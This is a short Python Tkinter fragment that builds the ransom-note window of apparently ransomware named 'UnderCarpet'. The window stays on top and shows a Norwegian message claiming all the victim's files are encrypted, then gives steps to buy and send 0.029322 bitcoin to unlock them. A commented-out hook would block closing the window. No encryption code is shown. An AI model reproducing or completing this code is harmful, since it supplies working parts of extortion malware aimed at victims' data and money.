#UnderCarpet#

def open_UCscreen():
    UCscreen = Toplevel(GORVFscreen)
    UCscreen.attributes('-topmost', True)
    UCscreen.title("UnderCarpet")
    UCscreen.configure(bg='black')
    UCscreen.config(relief=FLAT, borderwidth=20)
    '''UCscreen.protocol("WM_DELETE_WINDOW", prevent_closing)'''

    timer = Label(UCscreen, font=('calibri', 10, 'bold'), fg='red', bg='black')
    timer.grid(column=1, row=3)

    UC_title = Label(UCscreen, text='UNDER CARPET', font=('calibri', 20, 'bold'), fg='red', bg='black')
    UC_title.grid(column=1, row=1)

    warning_message = Label(UCscreen, text='FILENE DINE ER KRYPTERT', font=('calibri', 25, 'bold'), fg='red',
                            bg='black')
    warning_message.grid(column=1, row=2)

    text = Label(UCscreen,
                 text='\nHVA SKJEDE MED DATAMASKINEN MIN?\nALLE FILENE DINE ER KRYPTERT\nALLE DINE DOKUMENTER, DINE BILDER, DINE VIDEOER, DINE DATABASER, ALLE DINE PROGRAMMER OG ABSOLUT ALT ER KRYPTERT\n\nKAN JEG GJENNINN FILENE MINE?\nJA, DU KAN GJENOPPRETT ALLE DINE FILER. DU BARE FØLGER TRINNENE UNDER:\n\n1° ÅPNE NETTSIDEN VED Å KLIKKE PÅ "CLICK HERE TO PAY"\n2° OPPRETT EN KONTO\n3° SETER 0,029322 BITCOINS PÅ KONTOEN DIN\n4° SEND ALLE PENGENE TIL KONTOEN SOM VISES PÅ SKJERMENE DIN\n5. KLIKK PÅ "DECRYPT" FOR Å KRYPTERE FILENE DINE(DU KAN BARE DEKRYPTERE FILENE DINE HVIS DU ALLEREDE HAR GJORT BETALINGEN)\n')
    text.grid(column=1, row=4)
